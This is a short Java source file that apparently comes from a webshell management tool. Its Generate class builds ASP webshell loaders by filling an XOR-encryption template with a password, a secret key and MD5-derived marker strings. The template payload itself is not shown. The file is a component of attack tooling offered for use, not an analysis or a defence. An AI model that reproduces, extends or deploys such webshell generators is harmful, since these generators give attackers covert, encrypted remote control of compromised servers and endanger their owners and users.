package shells.cryptions.aspXor;

import java.io.InputStream;
import util.Log;
import util.TemplateEx;
import util.functions;

class Generate {
   public static byte[] GenerateShellLoder(String pass, String secretKey, String className) {
      byte[] data = null;
      String findStrMd5 = functions.md5(pass + secretKey);
      String findStrLeft = findStrMd5.substring(0, 6);
      String findStrRight = findStrMd5.substring(20, 26);

      try {
         InputStream inputStream = Generate.class.getResourceAsStream("template/" + className + ".bin");
         String code = new String(functions.readInputStream(inputStream));
         inputStream.close();
         code = code.replace("{pass}", pass).replace("{secretKey}", secretKey).replace("{findStrLeft}", findStrLeft).replace("{findStrRight}", findStrRight);
         code = TemplateEx.run(code);
         data = code.getBytes();
      } catch (Exception var9) {
         Log.error((Throwable)var9);
      }

      return data;
   }
}
